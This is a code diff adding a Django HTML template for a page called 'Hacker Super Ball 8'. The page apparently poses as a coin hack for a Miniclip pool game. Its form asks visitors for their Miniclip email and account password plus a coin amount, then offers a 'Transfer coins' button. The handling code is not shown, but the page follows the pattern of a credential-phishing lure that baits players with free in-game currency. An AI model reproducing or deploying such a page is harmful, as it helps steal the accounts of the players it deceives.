@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+{% load staticfiles %}
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Hacker Super Ball 8</title>
+    <link rel="shortcut icon" href="../static/super/Imagens/no.png" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="{% static 'super/BS/css/bootstrap.min.css' %}">
+    <link rel="stylesheet" href="{% static 'super/css/main.css' %}">
+    <script src="{% static 'super/BS/js/jquery-3.1.1.min.js' %}"></script>
+    <script src="{% static 'super/BS/js/bootstrap.js' %}"></script>
+</head>
+<body>
+<div id="image">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-xs-12 col-sm-12">
+                <br>
+                <br>
+                <div id="container">
+                    <div class="row">
+                        <div class="col-xs-12 col-lg-12 col-sm-12">
+                            <div id="ajuste">
+                                <form style="color: white; text-shadow: 1px 1px 1px black;" method="post" action="">
+                                  {% csrf_token %}
+                                  <div class="form-group">
+                                    <label for="exampleInputEmail1">Miniclip ID</label>
+                                    <input type="text" class="form-control" id="exampleInputEmail1" name="email" placeholder="Email">
+                                  </div>
+                                  <div class="form-group">
+                                    <label for="exampleInputPassword1">Password</label>
+                                    <input type="password" class="form-control" name="senha" id="exampleInputPassword1" placeholder="Password">
+                                  </div>
+                                  <div class="form-group">
+                                    <label class="sr-only" for="exampleInputAmount">Amount (in dollars)</label>
+                                    <div class="input-group" style="padding-right: 67%">
+                                      <div class="input-group-addon">$</div>
+                                      <input type="text" class="form-control" id="exampleInputAmount" name="quanti" placeholder="Coins">
+                                    </div>
+                                  </div>
+                                  <div class="input-group" style="padding-right: 60%">
+                                     <button type="submit" class="btn btn-primary" style="color: white; text-shadow: 1px 1px 1px black;"><img src="../static/super/Imagens/q.png"; style="width: 15%;"> Transfer coins</button>
+                                   </div>
+                                </form>
+                            </div>
+
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
